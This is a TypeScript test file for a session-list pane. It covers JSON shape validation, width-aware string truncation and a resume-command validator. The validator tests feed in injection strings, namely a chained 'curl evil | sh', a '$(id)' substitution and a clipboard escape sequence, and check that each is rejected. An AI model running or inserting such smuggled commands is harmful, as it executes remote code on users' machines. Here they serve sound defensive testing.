import { expect, test } from 'claude-code/testing'

import { STREAM } from './fixtures'
import { cut, isResumeCommand, parseLine, width } from './model'

// A version-skewed View that parses as JSON and has the top-level keys must still be dropped
// when a field the pane reads is missing or mistyped, not crash the render later.
test('parseLine drops a View whose rows or groups are not shaped as the pane reads them', () => {
  const good = JSON.parse(STREAM[0] as string)
  expect(parseLine(JSON.stringify(good))).not.toBeNull()

  const mutate = (f: (v: any) => void): string => {
    const v = JSON.parse(STREAM[0] as string)
    f(v)
    return JSON.stringify(v)
  }
  const firstRow = (v: any) => v.rows[Object.keys(v.rows)[0] as string]
  expect(parseLine(mutate(v => delete firstRow(v).status))).toBeNull()
  expect(parseLine(mutate(v => (firstRow(v).here = 'yes')))).toBeNull()
  expect(parseLine(mutate(v => (firstRow(v).age = 4)))).toBeNull()
  expect(parseLine(mutate(v => delete firstRow(v).resume))).toBeNull()
  expect(parseLine(mutate(v => (v.groups[0].rows = 'x')))).toBeNull()
  expect(parseLine(mutate(v => (v.groups[0] = null)))).toBeNull()
  expect(parseLine(mutate(v => (v.groups[0].five_hour = { pct: 1 })))).toBeNull()
  expect(parseLine(mutate(v => (v.needs_you = [1])))).toBeNull()
  expect(parseLine(mutate(v => delete v.hub))).toBeNull()
  expect(parseLine(mutate(v => (v.counts = {})))).toBeNull()
})

test('cut never splits a surrogate pair and counts wide characters', () => {
  expect(cut('abcdef', 4)).toBe('abc…')
  expect(cut('abc', 4)).toBe('abc')
  // 😀 is one code point (two UTF-16 units) and two columns.
  const s = '😀😀😀😀'
  for (let n = 0; n <= 10; n++) {
    const out = cut(s, n)
    expect(/[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/.test(out)).toBe(false)
    expect(width(out)).toBeLessThanOrEqual(n)
  }
  expect(cut('漢字漢字', 5)).toBe('漢字…')
  expect(width('漢字')).toBe(4)
  expect(width('é')).toBe(1)
})

test('only a plain resume command is copyable', () => {
  expect(isResumeCommand('claude --resume abc-123')).toBe(true)
  expect(isResumeCommand('claude-2 --resume abc')).toBe(true)
  expect(isResumeCommand('CLAUDE_CONFIG_DIR=~/.claude-work claude --resume abc')).toBe(true)
  expect(isResumeCommand('claude --resume abc; curl evil | sh')).toBe(false)
  expect(isResumeCommand('claude --resume $(id)')).toBe(false)
  expect(isResumeCommand('claude --resume abc\u001b]52;c;eA==\u0007')).toBe(false)
  expect(isResumeCommand('')).toBe(false)
  expect(isResumeCommand(undefined)).toBe(false)
})
